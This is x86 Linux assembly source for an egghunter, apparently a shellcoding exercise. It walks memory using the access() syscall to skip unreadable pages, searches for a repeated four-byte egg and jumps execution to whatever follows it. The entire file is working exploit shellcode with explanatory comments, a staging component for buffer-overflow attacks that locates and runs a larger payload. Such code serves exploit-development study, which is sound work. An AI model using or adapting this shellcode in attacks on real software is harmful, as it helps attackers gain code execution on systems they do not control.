global _start

section .text

_start:
        mov ebx, 0x50905090     ; 4 byte Egg (*Little-Endian)
        xor ecx, ecx        ; Zero out ECX
        mul ecx     ; Zero out EAX and EDX

next_page:
        or dx, 0xfff        ; Set PAGE_SIZE 4095 (0x1000)

next_addr:
        inc edx     ; Increment by 4095 (0x1000)
        pushad      ; Preserve all general purposes register values onto the stack
        lea ebx, [edx+4]        ; Checking if the address is readable
        mov al, 0x21        ; Set AL to syscall access() (0x21)
        int 0x80        ; Soft-interrupt to execute the syscall

        cmp al, 0xf2        ; Check for EFAULT (Invalid memory space)
        popad       ; Restore the preserved registers
        jz next_page        ; EFAULT --> Invalid memory space --> Next page

        cmp [edx], ebx      ; Check for the address if it contains our egg
        jnz next_addr       ; If not, go back to look for our first egg 

        cmp [edx+4], ebx        ; Check for the address + 4 if it contains our second egg 
        jnz next_addr       ; If not, go back to look for our second egg

        jmp edx     ; Both eggs are found --> JMP to EDX --> Continue execution flow
